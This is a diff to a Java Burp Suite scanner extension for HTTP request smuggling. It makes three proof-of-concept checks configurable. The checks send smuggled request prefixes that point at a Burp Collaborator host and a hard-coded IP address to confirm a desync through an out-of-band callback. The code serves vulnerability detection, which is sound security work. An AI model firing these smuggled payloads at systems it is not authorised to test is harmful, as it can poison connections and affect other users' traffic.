@@ -96,11 +96,21 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
     }
 
     boolean sendPoc(byte[] base, IHttpService service) {
-        boolean gpoc = sendPoc(base, service, "G", "G");
+        boolean gpoc = false;
+        boolean cpoc2 = false;
+        boolean cpoc3 = false;
+
+        if (Utilities.globalSettings.getBoolean("poc: G")) {
+            gpoc = sendPoc(base, service, "G", "G");
+        }
         //boolean cpoc = sendPoc(base, service,"GET / HTTP/1.1\r\nHost: "+service.getHost()+".z88m811soo7x6fxuo08vu4wd94fw3l.burpcollaborator.net\r\n\r\n");
         //boolean cpoc = sendPoc(base, service, "collab", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\n\r\n");
-        boolean cpoc2 = sendPoc(base, service, "collab2", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nFoo: x");
-        boolean cpoc3 = sendPoc(base, service, "collab3", "POST /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nContent-Length: 8\r\n\r\nfoo=");
+        if (Utilities.globalSettings.getBoolean("poc: headerConcat")) {
+            cpoc2 = sendPoc(base, service, "headerConcat", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nFoo: x");
+        }
+        if (Utilities.globalSettings.getBoolean("poc: bodyConcat")) {
+            cpoc3 = sendPoc(base, service, "bodyConcat", "POST /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 8\r\n\r\nfoo=");
+        }
 
         return gpoc || cpoc2 || cpoc3;
     }
